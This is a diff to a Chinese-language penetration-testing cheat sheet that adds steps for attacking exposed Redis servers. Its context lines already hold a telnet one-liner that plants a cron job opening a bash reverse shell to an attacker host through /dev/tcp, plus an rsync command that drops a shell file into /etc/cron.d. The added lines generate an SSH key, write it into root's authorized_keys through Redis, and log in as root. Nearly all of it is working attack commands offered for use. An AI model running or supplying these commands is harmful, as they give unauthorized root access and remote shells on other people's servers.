@@ -710,6 +710,15 @@ rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
 ```
 一行命令计划任务反弹shell：
 (sleep 1;echo "info";sleep 2;echo "set x \"\n* * * * * bash -i >& /dev/tcp/vps_ip/8888 0>&1\n\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir /var/spool/cron";sleep 1;echo "config set dbfilename root";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
+
+ssh秘钥写入
+ssh-keygen -t rsa   # 然后目录下生成2个文件 私钥:id_rsa 公钥:id_rsa.pub
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
+cat temp.txt #生成的ssh_payload
+(sleep 1;echo "info";sleep 2;echo "set x \"复制生成的ssh_payload\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir  /root/.ssh/";sleep 1;echo "config set dbfilename authorized_keys";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
+尝试连接即可:
+ssh root@139.X.X.X -i id_rsa
+
 ```
 ### axis_rce漏洞
 漏洞利用脚本：
